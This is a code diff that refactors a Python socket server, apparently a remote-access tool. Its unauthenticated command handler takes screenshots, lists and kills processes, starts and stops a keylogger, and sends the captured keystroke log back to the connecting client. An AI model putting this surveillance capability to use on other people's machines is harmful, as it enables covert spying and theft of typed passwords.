@@ -27,11 +27,11 @@ FLAG_APPS_END = 'APPS_END'
 BUFFER_SIZE = 1024
 
 # TMP
-TMP_PATH = os.path.join(os.getcwd(), 'server/tmp')
+TMP_PATH = os.path.join(os.getcwd(), 'tmp')
+
 
 #LOGGING
-LOG_DIR = r"./server/tmp/"
-logging.basicConfig(filename = (LOG_DIR+ "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename = (os.path.join(TMP_PATH, "keylog.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
 class Server:
@@ -47,70 +47,73 @@ class Server:
     self.server.listen(5)
     print(f'Server is listening on {self.host}:{self.port}')
     while True:
-      conn, addr = self.server.accept()
-      thread = threading.Thread(target=self.handle_client, args=(conn, addr))
-      thread.start()
-      print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")
+        conn, addr = self.server.accept()
+        thread = threading.Thread(target=self.handle_client, args=(conn, addr))
+        thread.start()
 
   # Handle client connection
   def handle_client(self, conn, addr):
     print(f"[NEW CONNECTION] {addr} connected.")
     connected = True
-    while connected:
-      data = conn.recv(BUFFER_SIZE)
+    try:
+      while connected:
+        data = conn.recv(BUFFER_SIZE)
 
-      # Shutdown
-      if data == CMD_SHUTDOWN.encode():
-        self.shutdown(conn, addr)
+        # Shutdown
+        if data == CMD_SHUTDOWN.encode():
+          self.shutdown(conn, addr)
 
-      # Take screenshot
-      elif data == CMD_TAKE_SCREENSHOT.encode():
-        self.take_screenshot()
-        self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
+        # Take screenshot
+        elif data == CMD_TAKE_SCREENSHOT.encode():
+          self.take_screenshot()
+          self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
 
-      # View processes
-      elif data == CMD_VIEW_PROCESSES.encode():
-        processes = self.get_all_processes()
-        conn.send(processes.encode())
-        time.sleep(0.01)
-        conn.send(FLAG_PROCESSES_END.encode())
+        # View processes
+        elif data == CMD_VIEW_PROCESSES.encode():
+          processes = self.get_all_processes()
+          conn.send(processes.encode())
+          time.sleep(0.01)
+          conn.send(FLAG_PROCESSES_END.encode())
 
-      # Kill process
-      elif data == CMD_KILL_PROCESS.encode():
-        pid = conn.recv(BUFFER_SIZE).decode()
-        self.kill_process(pid)
+        # Kill process
+        elif data == CMD_KILL_PROCESS.encode():
+          pid = conn.recv(BUFFER_SIZE).decode()
+          self.kill_process(pid)
 
-      # Start keylogger
-      elif data == CMD_START_KEYLOGGER.encode():
-        print('Starting keylogger')
-        self.start_keylogger()
+        # Start keylogger
+        elif data == CMD_START_KEYLOGGER.encode():
+          print('Starting keylogger')
+          self.start_keylogger()
 
-      # Stop keylogger
-      elif data == CMD_STOP_KEYLOGGER.encode():
-        print('Stopping keylogger')
-        self.stop_keylogger()
+        # Stop keylogger
+        elif data == CMD_STOP_KEYLOGGER.encode():
+          print('Stopping keylogger')
+          self.stop_keylogger()
+        
+        # Print keylogger
+        elif data == CMD_PRINT_KEYLOGGER.encode():
+          print('Printing keylogger')
+          self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
+
+        # View apps
+        elif data == CMD_VIEW_APPS.encode():
+          apps = self.get_all_apps()
+          conn.send(apps.encode())
+          time.sleep(0.01)
+          conn.send(FLAG_APPS_END.encode())
+
+        # Start app
+        elif data == CMD_START_APP.encode():
+          print('Starting app')
+          app_name = conn.recv(BUFFER_SIZE).decode()
+          self.start_app(str(app_name))
+
+      conn.close()
+      print(f"[DISCONNECTED] {addr} disconnected.")
+    except ConnectionResetError:
+      print(f"[DISCONNECTED] {addr} disconnected.")
+      conn.close()
       
-      # Print keylogger
-      elif data == CMD_PRINT_KEYLOGGER.encode():
-        print('Printing keylogger')
-        self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
-
-      # View apps
-      elif data == CMD_VIEW_APPS.encode():
-        apps = self.get_all_apps()
-        conn.send(apps.encode())
-        time.sleep(0.01)
-        conn.send(FLAG_APPS_END.encode())
-
-      # Start app
-      elif data == CMD_START_APP.encode():
-        print('Starting app')
-        app_name = conn.recv(BUFFER_SIZE).decode()
-        self.start_app(str(app_name))
-
-    conn.close()
-    print(f"[DISCONNECTED] {addr} disconnected.")
-
   def shutdown(self, conn, addr):
     print(f"[SHUTDOWN] {addr} disconnected.")
     print(f'Received shutdown command. Server is shutting down.')
